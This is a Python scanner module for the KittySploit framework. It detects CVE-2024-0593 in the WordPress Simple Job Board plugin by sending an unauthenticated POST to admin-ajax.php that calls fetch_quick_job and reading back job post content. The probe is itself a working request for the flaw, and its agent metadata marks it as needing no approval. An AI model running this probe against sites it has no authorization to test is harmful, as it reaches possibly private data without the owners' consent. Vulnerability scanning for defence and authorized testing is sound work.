#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Simple Job Board plugin for WordPress is vulnerable to unauthorized data access due to insufficient author."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Simple Job Board - Unauthorized Data Access Detection',
        'description': 'The Simple Job Board plugin for WordPress is vulnerable to unauthorized data access due to insufficient authorization checking in the fetch_quick_job() function in all versions up to and including 2.10.8. This makes it possible for unauthenticated attackers to fetch arbitrary posts, which can be password protected or private and contain sensitive information.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'wp', 'wordpress', 'wp-plugin', 'simple-job-board', 'exposure', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.wordfence.com/threat-intel/vulnerabilities/id/0a28a161-3dbc-4ef0-a2ce-4c102cf3cbb0',
            'https://plugins.trac.wordpress.org/changeset/3038476/simple-job-board/trunk/includes/class-simple-job-board-ajax.php',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-0593',
        ],
        'cve': 'CVE-2024-0593',
    }

    def run(self):
        path = '/wp-admin/admin-ajax.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='action=fetch_quick_job&job_id=1\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Apply Online', 'Submit</button>', 'Attach Resume', 'Start Company',)
        if all(m in body for m in body_all):
            self.set_info(severity='medium', reason='WordPress Simple Job Board - Unauthorized Data Access detected', path=path)
            return True
        return False

